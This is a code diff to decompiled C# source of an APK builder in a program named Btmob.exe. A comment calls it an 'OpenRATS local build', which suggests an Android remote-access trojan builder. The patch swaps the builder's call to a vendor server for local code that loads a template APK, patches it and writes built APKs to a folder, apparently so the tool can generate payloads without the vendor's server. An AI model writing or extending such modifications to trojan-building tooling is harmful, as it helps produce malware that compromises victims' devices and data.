@@ -5,8 +5,10 @@ using System.Collections.Specialized;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net.Http;
+using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Text;
 using System.Threading;
@@ -5352,15 +5354,33 @@ public class ApkMaker : basestyle
 					_Closure_0024__1176_002D2 CS_0024_003C_003E8__locals22 = new _Closure_0024__1176_002D2(arg4);
 					CS_0024_003C_003E8__locals22._0024VB_0024NonLocal__0024VB_0024Closure_2 = CS_0024_003C_003E8__locals19;
 					_Closure_0024__1176_002D2 closure_0024__1176_002D = CS_0024_003C_003E8__locals22;
-					TaskAwaiter<(bool, object)> taskAwaiter = MyServer.CommandStore(CS_0024_003C_003E8__locals19._0024VB_0024Local_params, CS_0024_003C_003E8__locals19._0024VB_0024Me.httpClient, CS_0024_003C_003E8__locals19._0024VB_0024Me.serverip).GetAwaiter();
-					if (!taskAwaiter.IsCompleted)
+					// OpenRATS local build: patch the template DEX and sign locally instead of
+					// posting to the vendor builder (MyServer.CommandStore).
 					{
-						await taskAwaiter;
-						TaskAwaiter<(bool, object)> taskAwaiter2 = default(TaskAwaiter<(bool, object)>);
-						taskAwaiter = taskAwaiter2;
+						string builtApkPath = null;
+						string buildError = null;
+						try
+						{
+							string templatePath = Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "template.apk");
+							if (!File.Exists(templatePath))
+							{
+								templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "template.apk");
+							}
+							if (!File.Exists(templatePath))
+							{
+								throw new FileNotFoundException("template.apk not found next to Btmob.exe", templatePath);
+							}
+							string outDir = Path.Combine(Path.GetDirectoryName(templatePath), "BuiltApks");
+							builtApkPath = LocalApkBuilder.Build(CS_0024_003C_003E8__locals19._0024VB_0024Local_params, templatePath, outDir);
+						}
+						catch (Exception ex3)
+						{
+							ProjectData.SetProjectError(ex3);
+							buildError = ex3.Message;
+							ProjectData.ClearProjectError();
+						}
+						closure_0024__1176_002D._0024VB_0024Local_result = ((buildError == null) ? ((true, (object)("Built: " + builtApkPath))) : ((false, (object)buildError)));
 					}
-					(bool, object) result = taskAwaiter.GetResult();
-					closure_0024__1176_002D._0024VB_0024Local_result = result;
 					if (!CS_0024_003C_003E8__locals19._0024VB_0024Me.IsDisposed && CS_0024_003C_003E8__locals19._0024VB_0024Me.IsHandleCreated)
 					{
 						if (CS_0024_003C_003E8__locals22._0024VB_0024Local_result.Item1)
